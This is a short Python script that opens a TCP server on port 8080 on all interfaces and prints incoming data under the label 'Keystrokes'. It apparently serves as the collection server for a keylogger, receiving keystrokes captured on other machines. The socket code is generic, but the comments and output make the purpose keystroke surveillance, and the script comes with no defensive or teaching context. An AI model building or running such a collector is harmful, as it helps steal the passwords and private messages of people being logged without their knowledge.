import socket

# Define the host and port
HOST = "0.0.0.0"  # Listen on all interfaces
PORT = 8080       

def start_server():
    try:
        # Create a socket
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((HOST, PORT))
        server_socket.listen(5)  # Maximum of 5 connections
        print(f"Server listening on {HOST}:{PORT}")

        while True:
            # Accept a client connection
            client_socket, client_address = server_socket.accept()
            print(f"Connection received from {client_address}")

            # Receive data from the client
            with client_socket:
                while True:
                    data = client_socket.recv(1024)  # Receive 1024 bytes
                    if not data:
                        break  # Exit loop if no data received
                    # Decode and print the keystrokes
                    print(f"Keystrokes: {data.decode('utf-8')}")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        server_socket.close()

if __name__ == "__main__":
    start_server()

